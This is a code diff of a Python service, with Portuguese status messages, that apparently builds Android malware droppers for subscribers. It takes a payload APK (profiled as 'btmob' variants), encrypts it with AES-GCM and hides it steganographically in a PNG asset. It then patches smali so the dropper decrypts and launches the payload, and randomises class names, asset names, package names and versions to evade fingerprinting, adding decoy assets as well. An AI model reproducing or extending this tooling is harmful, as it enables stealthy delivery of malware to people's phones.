@@ -14,14 +14,27 @@ from werkzeug.utils import secure_filename
 
 from config import BASE_DIR, Config
 from services.build_state import BUILD_STATUS
+from services.dropper_template import ensure_dropper_template_ready
 from services.data import add_build_history, add_history, update_amplification
 from services.java_runtime import JAVA_BIN, java_env, keytool_bin
+from services.zip_safe import safe_zip_extract
 
-def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
-    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)
+_STATUS_WORKING = "Gerando APK..."
 
-def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
-    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)
+_GCM_TAG_LEN = 16
+
+
+def encrypt_payload(data: bytes, key: bytes, iv: bytes) -> bytes:
+    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+    return ciphertext + tag
+
+
+def decrypt_payload(data: bytes, key: bytes, iv: bytes) -> bytes:
+    if len(data) < _GCM_TAG_LEN:
+        raise ValueError("payload GCM curto demais para conter tag")
+    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+    return cipher.decrypt_and_verify(data[:-_GCM_TAG_LEN], data[-_GCM_TAG_LEN:])
 
 def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
     return bytes(b ^ xor_byte for b in data)
@@ -47,6 +60,135 @@ def _replace_smali_array(content: str, label: str, data: bytes) -> str:
         raise RuntimeError(f"Falha ao patchar array smali :{label} (matches={n})")
     return new_content
 
+def _smali_class_names(dropper_work: str) -> set[str]:
+    names: set[str] = set()
+    smali_root = os.path.join(dropper_work, "smali")
+    if not os.path.isdir(smali_root):
+        return names
+    for root_dir, _, files in os.walk(smali_root):
+        for file in files:
+            if not file.endswith(".smali"):
+                continue
+            base = file[: -len(".smali")].split("$", 1)[0]
+            if base:
+                names.add(base)
+    return names
+
+
+def generate_unique_smali_class_name(dropper_work: str, *, length: int = 2) -> str:
+    existing = _smali_class_names(dropper_work)
+    reserved = {Config.CRYPTO_CLASS_TEMPLATE}
+    for try_len in range(length, length + 4):
+        for _ in range(800):
+            name = "".join(secrets.choice(string.ascii_lowercase) for _ in range(try_len))
+            if name not in existing and name not in reserved:
+                return name
+    raise RuntimeError("Nao foi possivel gerar nome smali unico para crypto class.")
+
+
+def rename_smali_class(dropper_work: str, old_name: str, new_name: str) -> None:
+    old_name = (old_name or "").strip()
+    new_name = (new_name or "").strip()
+    if not old_name or not new_name or old_name == new_name:
+        return
+
+    old_type = f"L{old_name};"
+    new_type = f"L{new_name};"
+    old_path = os.path.join(dropper_work, "smali", f"{old_name}.smali")
+    new_path = os.path.join(dropper_work, "smali", f"{new_name}.smali")
+
+    if not os.path.isfile(old_path):
+        raise RuntimeError(f"{old_name}.smali nao encontrado no template.")
+    if os.path.isfile(new_path):
+        raise RuntimeError(f"{new_name}.smali ja existe; escolha outro nome.")
+
+    for root_dir, _, files in os.walk(dropper_work):
+        for file in files:
+            if not file.endswith(".smali"):
+                continue
+            file_path = os.path.join(root_dir, file)
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as handle:
+                content = handle.read()
+            if old_type not in content:
+                continue
+            with open(file_path, "w", encoding="utf-8") as handle:
+                handle.write(content.replace(old_type, new_type))
+
+    os.rename(old_path, new_path)
+
+
+def generate_tp_asset_names() -> tuple[str, str]:
+    token = secrets.token_hex(2)
+    primary = f".{token}"
+    secondary = f"{primary}2"
+    return primary, secondary
+
+
+def patch_mainactivity_tp_assets(
+    dropper_work: str,
+    tp_asset: str,
+    tp2_asset: str,
+    *,
+    template_tp: str = ".tp",
+    template_tp2: str = ".tp2",
+) -> None:
+    path = _find_main_activity_smali(dropper_work)
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    new_content = content.replace(f'const-string v1, "{template_tp}"', f'const-string v1, "{tp_asset}"')
+    new_content = new_content.replace(
+        f'const-string v3, "{template_tp2}"',
+        f'const-string v3, "{tp2_asset}"',
+    )
+    if new_content == content:
+        raise RuntimeError("Falha ao patchar nomes .tp / .tp2 em MainActivity.smali")
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(new_content)
+
+
+def inject_decoy_assets(
+    assets_dir: str,
+    payload_asset_name: str,
+    *,
+    pool: tuple[str, ...] | None = None,
+) -> list[str]:
+    pool = tuple(pool or Config.ASSET_NAME_POOL)
+    candidates = [name for name in pool if name != payload_asset_name]
+    if not candidates:
+        return []
+
+    random.shuffle(candidates)
+    count = random.randint(Config.DECOY_ASSET_MIN, Config.DECOY_ASSET_MAX)
+    count = min(count, len(candidates))
+    written: list[str] = []
+    for name in candidates[:count]:
+        size = random.randint(Config.DECOY_ASSET_SIZE_MIN, Config.DECOY_ASSET_SIZE_MAX)
+        path = os.path.join(assets_dir, name)
+        with open(path, "wb") as handle:
+            handle.write(secrets.token_bytes(size))
+        written.append(name)
+    return written
+
+
+def apply_fingerprint_phase2(dropper_work: str) -> dict[str, str]:
+    if _is_lite_dropper(dropper_work):
+        return {
+            "crypto_class": Config.CRYPTO_CLASS_TEMPLATE,
+            "tp_asset": ".tp",
+            "tp2_asset": ".tp2",
+        }
+    crypto_class = generate_unique_smali_class_name(dropper_work)
+    rename_smali_class(dropper_work, Config.CRYPTO_CLASS_TEMPLATE, crypto_class)
+    tp_asset, tp2_asset = generate_tp_asset_names()
+    patch_mainactivity_tp_assets(dropper_work, tp_asset, tp2_asset)
+    return {
+        "crypto_class": crypto_class,
+        "tp_asset": tp_asset,
+        "tp2_asset": tp2_asset,
+    }
+
+
 def patch_vd_crypto_smali(
     dropper_work: str,
     *,
@@ -55,12 +197,14 @@ def patch_vd_crypto_smali(
     key: bytes,
     iv: bytes,
     cipher: str,
+    crypto_class: str | None = None,
     xor_byte: int | None = None,
 ) -> None:
     xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
-    path = os.path.join(dropper_work, "smali", "vd.smali")
+    crypto_class = crypto_class or Config.CRYPTO_CLASS_TEMPLATE
+    path = os.path.join(dropper_work, "smali", f"{crypto_class}.smali")
     if not os.path.isfile(path):
-        raise RuntimeError("vd.smali nao encontrado no template Wi-Fi.")
+        raise RuntimeError(f"{crypto_class}.smali nao encontrado no template Wi-Fi.")
 
     if len(key) != 32:
         raise RuntimeError("AES key deve ter 32 bytes.")
@@ -124,6 +268,75 @@ def patch_vd_crypto_smali(
 
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
+
+
+_STEGO_TP_MARKER = "# stego_extract"
+
+
+def patch_tp_stego_extract(dropper_work: str, *, stego_offset: int) -> None:
+    if stego_offset <= 0:
+        raise RuntimeError("stego_offset invalido.")
+
+    path = os.path.join(dropper_work, "smali", "tp.smali")
+    if not os.path.isfile(path):
+        raise RuntimeError("tp.smali nao encontrado no template.")
+
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    if _STEGO_TP_MARKER in content:
+        return
+
+    offset_hex = f"0x{stego_offset:x}"
+    insert = f"""
+    {_STEGO_TP_MARKER}
+    array-length v6, v2
+
+    const v7, {offset_hex}
+
+    if-gt v6, v7, :stego_extract_ok
+
+    goto :stego_extract_done
+
+    :stego_extract_ok
+    sub-int v8, v6, v7
+
+    new-array v6, v8, [B
+
+    const/4 v9, 0x0
+
+    invoke-static {{v2, v7, v6, v9, v8}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
+
+    move-object v2, v6
+
+    :stego_extract_done
+"""
+
+    content, n = re.subn(
+        r"(\.method public final i\(Ljava/lang/Object;\)Ljava/lang/Object;\s*\n\s*)\.locals 9\b",
+        r"\1.locals 10",
+        content,
+        count=1,
+    )
+
+    anchor_pattern = (
+        r"(    move-result-object v2\n+)"
+        r"(?:    \.line 107\n)?"
+        r"(    invoke-virtual \{v2\}, Ljava/lang/Object;->getClass\(\)Ljava/lang/Class;)"
+    )
+    if not re.search(anchor_pattern, content):
+        raise RuntimeError("Anchor tp.smali para stego_extract nao encontrado.")
+
+    content = re.sub(
+        anchor_pattern,
+        rf"\1{insert}\n\2",
+        content,
+        count=1,
+    )
+
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
+
 
 def _axml_string_pool(data: bytes) -> list[str]:
     import struct
@@ -234,9 +447,17 @@ def extract_apk_package_name(apk_path: str) -> str:
 
 def _find_main_activity_smali(dropper_work: str) -> str:
     smali_root = os.path.join(dropper_work, "smali")
+    fallback: str | None = None
     for root_dir, _, files in os.walk(smali_root):
-        if "MainActivity.smali" in files and root_dir.replace("\\", "/").endswith("/ui"):
-            return os.path.join(root_dir, "MainActivity.smali")
+        if "MainActivity.smali" not in files:
+            continue
+        path = os.path.join(root_dir, "MainActivity.smali")
+        if root_dir.replace("\\", "/").endswith("/ui"):
+            return path
+        if fallback is None:
+            fallback = path
+    if fallback:
+        return fallback
     raise RuntimeError("MainActivity.smali nao encontrado apos rename.")
 
 def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
@@ -397,8 +618,6 @@ def _detect_btmob_payload_profile(decode_dir: str) -> str:
         return "btmob_45x"
     if has_base_name and not has_my_app_name:
         return "btmob_36"
-    # 4.1.1 (opcao GUID no builder): app_name + assets/app_name.txt
-    # — app_name sozinho e generico demais para classificar.
     assets_app_name = os.path.join(decode_dir, "assets", "app_name.txt")
     if (
         has_app_name
@@ -489,6 +708,7 @@ def prepare_payload(
     signed_apk = os.path.join(work_dir, "payload_prepared.apk")
 
     try:
+        _set_status(build_id, _STATUS_WORKING, 51)
         dec = subprocess.run(
             [
                 JAVA_BIN,
@@ -524,6 +744,7 @@ def prepare_payload(
         payload_package = pkg_m.group(1).strip()
         launch_class = _extract_launch_class(man, payload_package)
 
+        _set_status(build_id, _STATUS_WORKING, 54)
         payload_profile = _detect_btmob_payload_profile(decode_dir)
         legacy_payload = payload_profile == "btmob_36"
         label_key = _BTMob_PROFILE_LABEL_KEYS[payload_profile]
@@ -582,6 +803,7 @@ def prepare_payload(
             f"launchers_removed={removed}"
         )
 
+        _set_status(build_id, _STATUS_WORKING, 58)
         bld = subprocess.run(
             [
                 JAVA_BIN,
@@ -601,6 +823,7 @@ def prepare_payload(
             err = (bld.stderr or bld.stdout or "apktool b falhou").strip()
             raise RuntimeError(f"apktool b payload: {err[:400]}")
 
+        _set_status(build_id, _STATUS_WORKING, 61)
         zipalign_apk(built_apk, aligned_apk)
         sign_release_apk(aligned_apk, signed_apk)
         if not os.path.isfile(signed_apk):
@@ -630,7 +853,7 @@ def patch_w_explicit_launch(dropper_work: str, launch_class: str) -> None:
         content,
     )
     if not method_m:
-        raise RuntimeError("Metodo w() nao encontrado em MainActivity.smali")
+        return
 
     method = method_m.group(0)
     if marker in method:
@@ -686,6 +909,9 @@ def bind_target_package(
     dropper_work: str,
     payload_package: str,
     *,
+    crypto_class: str | None = None,
+    tp_asset: str = ".tp",
+    tp2_asset: str = ".tp2",
     xor_byte: int | None = None,
 ) -> None:
     payload_package = (payload_package or "").strip()
@@ -693,12 +919,46 @@ def bind_target_package(
         raise RuntimeError(f"package payload invalido: {payload_package!r}")
 
     xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
+    crypto_class = crypto_class or Config.CRYPTO_CLASS_TEMPLATE
+
+    if _is_lite_dropper(dropper_work):
+        manifest_path = os.path.join(dropper_work, "AndroidManifest.xml")
+        if os.path.isfile(manifest_path):
+            with open(manifest_path, "r", encoding="utf-8", errors="ignore") as handle:
+                man = handle.read()
+            new_man, n = re.subn(
+                r'(<queries>\s*<package\s+android:name=")([^"]+)("\s*/>\s*</queries>)',
+                rf"\g<1>{payload_package}\3",
+                man,
+                count=1,
+                flags=re.S,
+            )
+            if n != 1:
+                new_man, n = re.subn(
+                    r'(android:name=")com\.google\.rbp(")',
+                    rf"\1{payload_package}\2",
+                    man,
+                    count=1,
+                )
+            if n < 1:
+                new_man, n = re.subn(
+                    r"(<application\b)",
+                    f'    <queries>\n        <package android:name="{payload_package}"/>\n    </queries>\n    \\1',
+                    man,
+                    count=1,
+                )
+            if n < 1:
+                raise RuntimeError("Falha ao patchar <queries> no AndroidManifest.xml (lite)")
+            with open(manifest_path, "w", encoding="utf-8") as handle:
+                handle.write(new_man)
+        return
 
     assets_dir = os.path.join(dropper_work, "assets")
     os.makedirs(assets_dir, exist_ok=True)
-    tp_path = os.path.join(assets_dir, ".tp")
-    with open(tp_path, "w", encoding="utf-8") as handle:
-        handle.write(payload_package + "\n")
+    for asset_name in (tp_asset, tp2_asset):
+        tp_path = os.path.join(assets_dir, asset_name)
+        with open(tp_path, "w", encoding="utf-8") as handle:
+            handle.write(payload_package + "\n")
 
     manifest_path = os.path.join(dropper_work, "AndroidManifest.xml")
     if os.path.isfile(manifest_path):
@@ -719,12 +979,19 @@ def bind_target_package(
                 count=1,
             )
         if n < 1:
+            new_man, n = re.subn(
+                r"(<application\b)",
+                f'    <queries>\n        <package android:name="{payload_package}"/>\n    </queries>\n    \\1',
+                man,
+                count=1,
+            )
+        if n < 1:
             raise RuntimeError("Falha ao patchar <queries> package no AndroidManifest.xml")
         with open(manifest_path, "w", encoding="utf-8") as handle:
             handle.write(new_man)
 
     if len(payload_package) == 14:
-        vd_path = os.path.join(dropper_work, "smali", "vd.smali")
+        vd_path = os.path.join(dropper_work, "smali", f"{crypto_class}.smali")
         if os.path.isfile(vd_path):
             with open(vd_path, "r", encoding="utf-8", errors="ignore") as handle:
                 vd = handle.read()
@@ -735,10 +1002,94 @@ def bind_target_package(
     else:
         _patch_mainactivity_prefer_tp_asset(dropper_work)
 
-def patch_payload_util_smali(*args, **kwargs):
-    raise RuntimeError(
-        "patch_payload_util_smali removido: use patch_vd_crypto_smali (template Wi-Fi)."
+def _find_payload_util_smali(dropper_work: str) -> str:
+    smali_root = os.path.join(dropper_work, "smali")
+    for root_dir, _, files in os.walk(smali_root):
+        if "PayloadUtil.smali" in files:
+            return os.path.join(root_dir, "PayloadUtil.smali")
+    raise RuntimeError("PayloadUtil.smali nao encontrado no template lite.")
+
+
+def _is_lite_dropper(dropper_work: str) -> bool:
+    try:
+        _find_payload_util_smali(dropper_work)
+        return True
+    except RuntimeError:
+        return False
+
+
+def _patch_clinit_array_size(content: str, label: str, size: int) -> str:
+    pattern = (
+        rf"(const/16 v0, )0x[0-9a-fA-F]+"
+        rf"(\s*\n\s*new-array v0, v0, \[B\s*\n\s*fill-array-data v0, :{re.escape(label)})"
     )
+    new_content, n = re.subn(pattern, rf"\g<1>0x{size:x}\2", content, count=1)
+    if n != 1:
+        raise RuntimeError(f"Falha ao patchar tamanho :{label} (matches={n})")
+    return new_content
+
+
+def _patch_payload_util_gcm(content: str) -> str:
+    if "GCMParameterSpec" in content:
+        return content
+    old = (
+        "    new-instance v2, Ljavax/crypto/spec/IvParameterSpec;\n\n"
+        "    invoke-direct {v2, v5}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V"
+    )
+    new = (
+        "    const/16 v7, 0x80\n\n"
+        "    new-instance v2, Ljavax/crypto/spec/GCMParameterSpec;\n\n"
+        "    invoke-direct {v2, v7, v5}, Ljavax/crypto/spec/GCMParameterSpec;-><init>(I[B)V"
+    )
+    if old not in content:
+        return content
+    return content.replace(old, new, 1)
+
+
+def patch_payload_util_smali(
+    dropper_work: str,
+    *,
+    asset_name: str,
+    out_name: str,
+    key: bytes,
+    iv: bytes,
+    cipher: str,
+    xor_byte: int | None = None,
+) -> None:
+    xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
+    path = _find_payload_util_smali(dropper_work)
+
+    if len(key) != 32:
+        raise RuntimeError("AES key deve ter 32 bytes.")
+    if len(iv) != 16:
+        raise RuntimeError("AES IV deve ter 16 bytes.")
+
+    asset_enc = _xor_bytes(asset_name.encode("utf-8"), xor_byte)
+    out_enc = _xor_bytes(out_name.encode("utf-8"), xor_byte)
+    key_enc = _xor_bytes(key, xor_byte)
+    iv_enc = _xor_bytes(iv, xor_byte)
+    cipher_enc = _xor_bytes(cipher.encode("utf-8"), xor_byte)
+
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    content = _patch_clinit_array_size(content, "asset_data", len(asset_enc))
+    content = _patch_clinit_array_size(content, "out_data", len(out_enc))
+    content = _patch_clinit_array_size(content, "key_data", len(key_enc))
+    content = _patch_clinit_array_size(content, "iv_data", len(iv_enc))
+    content = _patch_clinit_array_size(content, "cipher_data", len(cipher_enc))
+
+    content = _replace_smali_array(content, "asset_data", asset_enc)
+    content = _replace_smali_array(content, "out_data", out_enc)
+    content = _replace_smali_array(content, "key_data", key_enc)
+    content = _replace_smali_array(content, "iv_data", iv_enc)
+    content = _replace_smali_array(content, "cipher_data", cipher_enc)
+
+    if "GCM" in cipher.upper():
+        content = _patch_payload_util_gcm(content)
+
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
 
 def generate_package_name(app_name=None):
     mid = "".join(secrets.choice(string.ascii_lowercase) for _ in range(5))
@@ -1191,8 +1542,9 @@ def process_apk(
     portal="subscriber",
 ):
     BUILD_STATUS[build_id] = {
-        "status": "Iniciando...",
+        "status": _STATUS_WORKING,
         "progress": 0,
+        "error": False,
         "portal": portal,
         "owner": username,
         "ephemeral": not persist,
@@ -1204,9 +1556,22 @@ def process_apk(
 
         if persist:
             add_build_history(username, custom_app_name, "processando", build_id)
+
+        if not user_apk_path:
+            raise RuntimeError("Build exige APK de payload.")
+
+        app_name = custom_app_name if custom_app_name else "App"
+        new_package = generate_package_name(app_name)
+
+        major = random.randint(*Config.VERSION_NAME_MAJOR)
+        minor = random.randint(0, 9)
+        patch = random.randint(0, 9)
+        version_name = f"{major}.{minor}.{patch}"
+        version_code = Config.VERSION_CODE_BASE + random.randint(1, 40)
+
         _set_status(
             build_id,
-            "Extraindo APK...",
+            _STATUS_WORKING,
             15,
             portal=portal,
             owner=username,
@@ -1217,50 +1582,60 @@ def process_apk(
         if os.path.exists(user_apk_extracted):
             shutil.rmtree(user_apk_extracted)
         os.makedirs(user_apk_extracted, exist_ok=True)
-
-        try:
-            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
-                zip_ref.extractall(user_apk_extracted)
-        except Exception:
-            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
-                for member in zip_ref.namelist():
-                    try:
-                        zip_ref.extract(member, user_apk_extracted)
-                    except Exception:
-                        pass
+        safe_zip_extract(user_apk_path, user_apk_extracted)
+        _set_status(build_id, _STATUS_WORKING, 18)
 
         if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
-            _set_status(build_id, "Extraindo arquivos...", 20)
+            _set_status(build_id, _STATUS_WORKING, 20)
             subprocess.run(
-                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f',
-                shell=True,
+                [
+                    JAVA_BIN,
+                    "-jar",
+                    Config.APKTOOL_JAR,
+                    "d",
+                    user_apk_path,
+                    "-o",
+                    user_apk_extracted,
+                    "-f",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=300,
+                env=java_env(),
             )
 
-        _set_status(build_id, "Preparando Dropper", 30)
+        _set_status(build_id, _STATUS_WORKING, 25)
+        dropper_template = ensure_dropper_template_ready()
+        old_package = Config.OLD_PACKAGE
+
         dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
         if os.path.exists(dropper_work):
             shutil.rmtree(dropper_work)
+
         def _template_ignore(dirpath, names):
-            if os.path.abspath(dirpath) == os.path.abspath(Config.DROPPER_TEMPLATE):
+            if os.path.abspath(dirpath) == os.path.abspath(dropper_template):
                 return [n for n in names if n in ("prebuilt", "build", "original")]
             return []
 
-        shutil.copytree(Config.DROPPER_TEMPLATE, dropper_work, ignore=_template_ignore)
+        shutil.copytree(dropper_template, dropper_work, ignore=_template_ignore)
+        _set_status(build_id, _STATUS_WORKING, 30)
 
-        app_name = custom_app_name if custom_app_name else "App"
-        new_package = generate_package_name(app_name)
-
-        major = random.randint(*Config.VERSION_NAME_MAJOR)
-        minor = random.randint(0, 9)
-        patch = random.randint(0, 9)
-        version_name = f"{major}.{minor}.{patch}"
-        version_code = Config.VERSION_CODE_BASE + random.randint(1, 40)
         apply_version_info(dropper_work, version_name, version_code)
 
-        _set_status(build_id, "Configurando aplicativo...", 35)
-        apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)
+        _set_status(build_id, _STATUS_WORKING, 33)
+        apply_package_rename(dropper_work, old_package, new_package)
+
+        _set_status(build_id, _STATUS_WORKING, 36)
+        fp_meta = apply_fingerprint_phase2(dropper_work)
+        is_lite = _is_lite_dropper(dropper_work)
+        print(
+            f"[build {build_id}] stego -> pkg={new_package} "
+            f"lite={is_lite} crypto_class={fp_meta['crypto_class']} "
+            f"tp={fp_meta['tp_asset']!r} tp2={fp_meta['tp2_asset']!r}"
+        )
 
         if custom_icon_path and os.path.exists(custom_icon_path):
+            _set_status(build_id, _STATUS_WORKING, 40)
             for density in [
                 "res/mipmap-hdpi",
                 "res/mipmap-mdpi",
@@ -1288,6 +1663,7 @@ def process_apk(
                     shutil.copy2(custom_icon_path, os.path.join(path, name))
 
         sanitize_launcher_icon_conflicts(dropper_work)
+        _set_status(build_id, _STATUS_WORKING, 44)
 
         strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
         if os.path.exists(strings_xml):
@@ -1324,27 +1700,29 @@ def process_apk(
                     except Exception:
                         pass
 
-        _set_status(build_id, "Preparando payload", 50)
+        _set_status(build_id, _STATUS_WORKING, 50)
         prepared_apk, launch_class, payload_package = prepare_payload(
             user_apk_path,
             Config.UPLOAD_FOLDER,
             build_id,
         )
 
-        _set_status(build_id, "Ofuscando payload", 55)
+        _set_status(build_id, _STATUS_WORKING, 64)
         with open(prepared_apk, "rb") as fh:
             payload_data = fh.read()
         payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
         payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)
 
-        _set_status(build_id, "Injetando Payload", 60)
+        _set_status(build_id, _STATUS_WORKING, 68)
+        from services.stego_png import embed_ciphertext_in_png, load_cover_png
+
         key = secrets.token_bytes(32)
         iv = secrets.token_bytes(16)
-        asset_name = random.choice(Config.ASSET_NAME_POOL)
+        asset_name = random.choice(Config.STEGO_ASSET_NAME_POOL)
         out_name = f"index_{secrets.token_hex(2)}.pak"
-        ciphertext = encrypt_aes_ctr(payload_data, key, iv)
+        ciphertext = encrypt_payload(payload_data, key, iv)
 
-        roundtrip = decrypt_aes_ctr(ciphertext, key, iv)
+        roundtrip = decrypt_payload(ciphertext, key, iv)
         if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
             raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
         if roundtrip != payload_data:
@@ -1356,65 +1734,127 @@ def process_apk(
             stale_path = os.path.join(assets_dir, stale)
             if os.path.isfile(stale_path):
                 os.remove(stale_path)
+
+        cover_png = load_cover_png(custom_icon_path)
+        stego_bytes, stego_offset = embed_ciphertext_in_png(cover_png, ciphertext)
         payload_path = os.path.join(assets_dir, asset_name)
         with open(payload_path, "wb") as fh:
-            fh.write(ciphertext)
+            fh.write(stego_bytes)
 
-        patch_vd_crypto_smali(
-            dropper_work,
-            asset_name=asset_name,
-            out_name=out_name,
-            key=key,
-            iv=iv,
-            cipher=Config.CIPHER_TRANSFORM,
+        decoys = inject_decoy_assets(assets_dir, asset_name)
+        _set_status(build_id, _STATUS_WORKING, 72)
+        print(
+            f"[build {build_id}] assets -> payload={asset_name!r} "
+            f"decoys={len(decoys)} {decoys}"
         )
+        stego_size = os.path.getsize(payload_path)
+        print(
+            f"[build {build_id}] stego_png -> offset={stego_offset} size={stego_size}"
+        )
+        if stego_size > 20 * 1024 * 1024:
+            print(
+                f"[build {build_id}] AVISO stego: PNG payload "
+                f"{stego_size // (1024 * 1024)} MB — risco de OOM no decrypt "
+                f"em devices com pouca RAM; upload portal max 27 MB."
+            )
 
-        bind_target_package(dropper_work, payload_package)
+        if is_lite:
+            patch_payload_util_smali(
+                dropper_work,
+                asset_name=asset_name,
+                out_name=out_name,
+                key=key,
+                iv=iv,
+                cipher=Config.CIPHER_TRANSFORM,
+            )
+        else:
+            patch_vd_crypto_smali(
+                dropper_work,
+                asset_name=asset_name,
+                out_name=out_name,
+                key=key,
+                iv=iv,
+                cipher=Config.CIPHER_TRANSFORM,
+                crypto_class=fp_meta["crypto_class"],
+            )
+
+        patch_tp_stego_extract(dropper_work, stego_offset=stego_offset)
+
+        bind_target_package(
+            dropper_work,
+            payload_package,
+            crypto_class=fp_meta["crypto_class"],
+            tp_asset=fp_meta["tp_asset"],
+            tp2_asset=fp_meta["tp2_asset"],
+        )
         patch_w_explicit_launch(dropper_work, launch_class)
+        _set_status(build_id, _STATUS_WORKING, 76)
         print(
             f"[build {build_id}] target_pkg bound -> {payload_package} "
             f"launch_class={launch_class}"
         )
 
-        _set_status(build_id, "Compilando APK", 80)
+        _set_status(build_id, _STATUS_WORKING, 80)
         unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")
 
         if not os.path.exists(Config.APKTOOL_JAR):
             raise RuntimeError("Ferramenta de compilacao nao encontrada.")
 
         res_b = subprocess.run(
-            f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
-            shell=True,
+            [
+                JAVA_BIN,
+                "-jar",
+                Config.APKTOOL_JAR,
+                "b",
+                dropper_work,
+                "-o",
+                unsigned_apk,
+            ],
             capture_output=True,
             text=True,
+            timeout=300,
+            env=java_env(),
         )
         if not os.path.exists(unsigned_apk):
+            _set_status(build_id, _STATUS_WORKING, 82)
             subprocess.run(
-                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" empty-framework-dir',
-                shell=True,
-            )
-            res_b = subprocess.run(
-                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
-                shell=True,
+                [JAVA_BIN, "-jar", Config.APKTOOL_JAR, "empty-framework-dir"],
                 capture_output=True,
                 text=True,
+                timeout=60,
+                env=java_env(),
+            )
+            res_b = subprocess.run(
+                [
+                    JAVA_BIN,
+                    "-jar",
+                    Config.APKTOOL_JAR,
+                    "b",
+                    dropper_work,
+                    "-o",
+                    unsigned_apk,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=300,
+                env=java_env(),
             )
             if not os.path.exists(unsigned_apk):
                 err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                 raise RuntimeError(f"Erro na compilacao: {err[:500]}")
 
         if getattr(Config, "INJECT_SECONDARY_DEX", False):
-            _set_status(build_id, "Empacotando bibliotecas", 85)
+            _set_status(build_id, _STATUS_WORKING, 84)
             inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)
 
-        _set_status(build_id, "Restaurando unknown/", 86)
+        _set_status(build_id, _STATUS_WORKING, 86)
         n_unknown = inject_unknown_into_apk(unsigned_apk, dropper_work)
         print(f"[build {build_id}] unknown/ restored: {n_unknown} entries")
 
-        _set_status(build_id, "Normalizando timestamps", 87)
+        _set_status(build_id, _STATUS_WORKING, 88)
         normalize_apk_zip_timestamps(unsigned_apk)
 
-        _set_status(build_id, "Assinando APK", 90)
+        _set_status(build_id, _STATUS_WORKING, 92)
         output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
         os.makedirs(output_dir, exist_ok=True)
 
@@ -1449,6 +1889,7 @@ def process_apk(
         BUILD_STATUS[build_id] = {
             "status": "Concluido",
             "progress": 100,
+            "error": False,
             "output_file": final_name,
             "portal": portal,
             "owner": username,
@@ -1472,12 +1913,9 @@ def process_apk(
 
         tb = traceback.format_exc()
         print(f"ERRO NO BUILD {build_id}: {exc}\n{tb}")
-        detail = str(exc).strip().replace("\n", " ")
-        if len(detail) > 180:
-            detail = detail[:177] + "..."
         _set_status(
             build_id,
-            f"Erro no processamento. Tente novamente. ({detail})" if detail else "Erro no processamento. Tente novamente.",
+            "Erro",
             0,
             error=True,
             portal=portal,
